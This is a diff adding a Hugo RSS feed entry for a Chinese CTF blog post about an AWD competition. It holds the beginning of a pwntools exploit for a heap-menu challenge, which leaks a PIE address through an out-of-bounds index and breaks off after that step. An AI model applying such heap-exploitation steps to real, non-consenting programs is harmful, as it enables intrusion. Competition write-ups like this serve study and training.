@@ -7,9 +7,288 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Expl0rer.Ct</copyright><atom:link href="https://expl0rer.top/categories/ctfpwn/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>AWD水友赛</title>
+        <link>https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/</link>
+        <pubDate>Thu, 02 Oct 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/</guid>
+        <description>&lt;img src="https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd.png" alt="Featured image of post AWD水友赛" /&gt;&lt;p&gt;前言：激战时间是2025年10月2日13：10——17：00&lt;/p&gt;
+&lt;h2 id=&#34;exploit思路&#34;&gt;Exploit思路
+&lt;/h2&gt;&lt;p&gt;AI分析&amp;hellip;绷不住：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3.png&#34;
+	width=&#34;1186&#34;
+	height=&#34;233&#34;
+	srcset=&#34;https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3_hu_4d4605e834adbb91.png 480w, https://expl0rer.top/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/3_hu_bdfea1c0a1d24f9.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;509&#34;
+		data-flex-basis=&#34;1221px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;自己本地复现去吧。&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 环境配置&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binary&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;terminal&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tmux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;splitw&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;-h&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc.so.6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 命令发送函数：发送指定命令编号&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 捕获马匹函数：指定索引和颜色（0=bay,1=chestnut,2=gray）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;colors&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bay&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;chestnut&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gray&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;colors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 命名马匹函数：指定索引和名称（支持字节流）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;naming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 展示马匹函数：指定索引，触发信息输出&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 马匹跳舞函数：指定索引，触发函数指针调用&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;dance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 释放马匹函数：指定索引，释放堆内存&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;release&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. 泄露 PIE 基址：通过 show(-7) 读取非法索引内存&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
